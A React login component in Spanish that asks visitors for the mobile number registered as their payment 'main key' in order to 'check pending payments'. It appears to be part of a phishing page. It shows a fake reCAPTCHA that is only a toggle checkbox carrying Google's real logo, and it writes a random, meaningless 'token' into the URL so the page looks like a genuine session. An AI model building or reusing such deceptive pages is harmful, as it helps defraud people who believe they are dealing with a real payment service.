import React, { useState, useEffect } from 'react';

function Login({ onLogin }) {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [isVerified, setIsVerified] = useState(false);

  useEffect(() => {
    try {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let token = '';
      for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      const base64Token = btoa(token + Date.now()).replace(/=/g, '');
      const url = new URL(window.location.href);
      url.searchParams.set('token', base64Token);
      window.history.replaceState(null, '', url.toString());
    } catch(e) {}
  }, []);

  const handleSubmit = () => {
    if (phoneNumber.length === 10 && isVerified) {
      onLogin(phoneNumber);
    }
  };

  return (
    <div className="bg-white rounded-3xl p-8 w-full max-w-md shadow-2xl z-10">
      <h2 className="text-2xl font-bold text-gray-900 mb-2 text-center">
        Ingresa tu número de celular
      </h2>
      
      <p className="text-gray-500 text-sm text-center mb-6 leading-snug">
        Usa el <span className="font-semibold">número de celular que registraste como tu llave principal</span> para consultar si tienes pagos pendientes.
      </p>

      <div className="mb-6">
        <label htmlFor="phone" className="block text-sm font-bold text-gray-800 mb-2">
          Número de celular
        </label>
        <input
          type="tel"
          id="phone"
          className="w-full bg-gray-100 border border-gray-200 text-gray-900 text-lg rounded-xl focus:ring-blue-500 focus:border-blue-500 block p-3.5 placeholder-gray-400 outline-none transition-all"
          placeholder="Ej: 3001234567"
          value={phoneNumber}
          onChange={(e) => setPhoneNumber(e.target.value)}
        />
        <p className="mt-2 text-xs text-gray-400">
          Debe tener 10 dígitos. Si cambiaste de número, podrás actualizarlo después.
        </p>
      </div>

      {/* ReCAPTCHA Mock */}
      <div className="mb-6 bg-gray-50 border border-gray-300 rounded-md p-3 flex items-center justify-between h-16 w-full max-w-[304px] mx-auto sm:mx-0">
          <div className="flex items-center">
              <div 
                  className="w-6 h-6 border-2 border-gray-300 rounded-sm bg-white mr-3 cursor-pointer flex items-center justify-center hover:border-gray-400"
                  onClick={() => setIsVerified(!isVerified)}
              >
                  {isVerified && <div className="text-green-600 font-bold text-lg">✓</div>}
              </div>
              <span className="text-sm text-gray-700">No soy un robot</span>
          </div>
          <div className="flex flex-col items-center justify-center">
              <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" className="w-8 h-8 opacity-70" />
              <span className="text-[10px] text-gray-500 mt-1">reCAPTCHA</span>
              <div className="text-[8px] text-gray-400">
                  <a href="#" className="hover:underline">Privacidad</a> - <a href="#" className="hover:underline">Términos</a>
              </div>
          </div>
      </div>

      <button 
          className={`w-full py-3.5 rounded-full text-lg font-bold transition-colors ${
              phoneNumber.length === 10 && isVerified 
              ? 'bg-gradient-to-r from-green-400 to-green-500 text-white shadow-lg hover:from-green-500 hover:to-green-600' 
              : 'bg-[#e0e4e5] text-[#aeb4b7] cursor-not-allowed'
          }`}
          disabled={!(phoneNumber.length === 10 && isVerified)}
          onClick={handleSubmit}
      >
        Ingresar
      </button>

      <div className="mt-6 text-center">
          <p className="text-xs text-gray-500">
              Al continuar, aceptas nuestros <a href="#" className="text-blue-600 font-semibold hover:underline">términos y condiciones</a>.
          </p>
      </div>
    </div>
  );
}

export default Login;
